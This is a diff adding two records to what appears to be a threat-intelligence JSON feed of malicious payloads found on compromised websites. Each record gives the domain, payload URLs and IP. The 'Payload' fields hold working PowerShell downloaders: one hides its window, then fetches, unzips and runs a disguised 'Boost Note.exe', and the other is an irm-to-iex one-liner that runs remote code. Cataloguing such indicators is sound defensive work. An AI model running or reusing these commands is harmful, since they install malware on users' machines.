@@ -1407,5 +1407,43 @@
     ],
     "ReportId": "cmwj2p67u16ef0oml8gvz64x2",
     "ScannedAt": "2026-11-16T09:40:35.633000+00:00"
+  },
+  {
+    "UrlDomain": "www.attorneycollectionservices.com",
+    "DeliveryUrl": [
+      "fbifr.com"
+    ],
+    "PayloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "IP": [
+      "176.9.86.61"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "ReportId": "cmwj53tef17dk0omlyyz1wnrf",
+    "ScannedAt": "2026-11-16T10:47:58.057000+00:00"
+  },
+  {
+    "UrlDomain": "digitalfreedom.com.br",
+    "DeliveryUrl": [
+      "github.pw"
+    ],
+    "PayloadUrl": [
+      "https://github.pw/8pchkbdes5/6d9667cd120637a1"
+    ],
+    "IP": [
+      "104.21.63.151"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://github[.]pw/8pchkbdes5/6d9667cd120637a1')|iex",
+    "ResolvedDownloadUrl": [
+      "https://github.pw/8pchkbdes5/6d9667cd120637a1"
+    ],
+    "ReportId": "cmwj51q3c17cv0oml0cqeivw1",
+    "ScannedAt": "2026-11-16T10:46:20.560000+00:00"
   }
 ]
